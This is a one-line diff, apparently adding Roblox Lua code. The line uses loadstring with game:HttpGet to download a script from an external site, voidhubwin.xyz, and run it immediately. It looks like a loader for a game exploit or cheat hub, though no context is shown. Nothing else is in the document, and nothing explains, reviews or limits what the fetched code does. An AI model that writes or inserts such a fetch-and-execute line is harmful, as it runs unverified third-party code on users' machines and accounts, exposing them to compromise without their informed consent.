@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://voidhubwin.xyz/Script"))()
